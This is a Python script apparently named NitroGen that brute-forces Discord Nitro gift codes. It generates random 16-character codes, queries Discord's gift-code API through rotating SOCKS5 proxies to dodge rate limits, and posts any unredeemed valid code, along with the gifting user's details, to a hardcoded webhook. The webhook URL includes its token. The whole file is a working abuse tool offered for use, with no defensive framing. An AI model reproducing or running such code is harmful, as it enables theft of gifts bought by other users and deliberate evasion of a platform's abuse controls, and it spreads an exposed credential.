import random
import string
import aiohttp
import colorama
import aiojobs
import asyncio
import json


try:
    import uvloop
except ImportError:
    print("uvloop not installed")
else:
    uvloop.install()

    print("uvloop installed!")

from aiohttp_socks import ProxyConnector, ProxyConnectionError
from discord import AsyncWebhookAdapter, Webhook, Embed
from aiohttp import ClientTimeout
from json import JSONDecodeError
from colorama import Fore
from os import path
from typing import List


class NitroGen:
    def __init__(self, webhook: str) -> None:
        colorama.init()

        self.total_requests = 0
        self.failed_requests = 0
        self.successful_requests = 0

        self.major_errors = 0

        proxy_path = path.join(
            path.dirname(path.realpath(__file__)),
            "socks5_proxies.txt"
        )

        with open(proxy_path, "r") as f_:
            proxies = f_.read().strip().split()

        self.sessions: List[aiohttp.ClientSession] = [
            aiohttp.ClientSession(
                connector=ProxyConnector.from_url("socks5://" + proxy),
                timeout=ClientTimeout(total=120)
            ) for proxy in proxies
        ]
        self.sessions_len = len(self.sessions) - 1

        self.discord_session = aiohttp.ClientSession()
        self.discord = Webhook.from_url(
            webhook,
            adapter=AsyncWebhookAdapter(self.discord_session)
        )

        print(Fore.GREEN + "Proxies loaded!")

    async def generate_code(self, code: str = None) -> None:
        print(Fore.WHITE)

        if not code:
            code = "".join(random.choices(
                string.ascii_uppercase +
                string.digits +
                string.ascii_lowercase,
                k=16
            ))

        nitro = "https://discord.gift/" + code
        try:
            resp = await self.sessions[
                random.randint(0, self.sessions_len)
            ].get(
                "https://discord.com/api/v6/entitlements/gift-codes/" +
                code
                + "?with_application=false&with_subscription_plan=true",
                ssl=False
            )
        except ProxyConnectionError:
            print(Fore.YELLOW + "Proxy error, retrying")
            await self.generate_code(code)
        else:
            if resp.status == 200:
                self.successful_requests += 1
                try:
                    json_data = await resp.json()
                except JSONDecodeError:
                    print(Fore.RED + "Json Decoding error")
                    self.major_errors += 1
                else:
                    if json_data["uses"] != json_data["max_uses"]:
                        print(Fore.GREEN + nitro)

                        json_pretty = json.dumps(
                            json_data,
                            indent=2,
                            sort_keys=True
                        )

                        embed = Embed(
                            title="UwU we found a gift for you",
                            url=nitro,
                            description=f"```json\n{json_pretty}\n```"
                        )
                        embed.set_thumbnail(
                            url="https://cdn.discordapp.com/avatars/{}/{}.{}?size=1024".format(
                                json_data["user"]["id"],
                                json_data["user"]["avatar"],
                                "gif" if json_data["user"]["avatar"].startswith("a_") else "jpg"
                            )
                        )

                        await self.discord.send(
                            content="@everyone",
                            embed=embed
                        )

                        await self.discord.send(nitro)
                    else:
                        print(
                            Fore.CYAN,
                            nitro,
                            "Valid code found, but redeemed",
                            sep="\n"
                        )

            elif resp.status == 429:
                timeout = (
                    resp.headers["X-RateLimit-Reset-After"]
                    if "X-RateLimit-Reset-After" in resp.headers else 1.0
                )
                print(Fore.CYAN + "Timeout, retrying in " + str(timeout))
                await asyncio.sleep(timeout)
                await self.generate_code(code)
            else:
                self.failed_requests += 1
                print(Fore.RED + nitro)

        self.total_requests += 1

        print(
            "\n",
            Fore.WHITE,
            "Total: ", Fore.WHITE, self.total_requests, " | ",
            Fore.WHITE,
            "Errors: ", Fore.YELLOW, self.major_errors, " | ",
            Fore.WHITE,
            "Failed: ", Fore.RED, self.failed_requests, " | ",
            Fore.WHITE,
            "Successful: ", Fore.GREEN, self.successful_requests,
            sep=""
        )

    async def close(self) -> None:
        for session in self.sessions:
            await session.close()

        await self.discord_session.close()


if __name__ == "__main__":
    async def main() -> None:
        nitro_gen = NitroGen(
            webhook="https://canary.discord.com/api/webhooks/830090228769095720/t-bONLH2W9D0kciBlU228AqK1Mn6t9eAcIGMhvtuL1309si8tkjj4bZ9Rs8mkLihPCo6"
        )
        scheduler = await aiojobs.create_scheduler()

        while True:
            await scheduler.spawn(nitro_gen.generate_code())

            await asyncio.sleep(0.15)

        await scheduler.close()
        await nitro_gen.close()

    loop = asyncio.get_event_loop()
    loop.run_until_complete(main())
    loop.close()
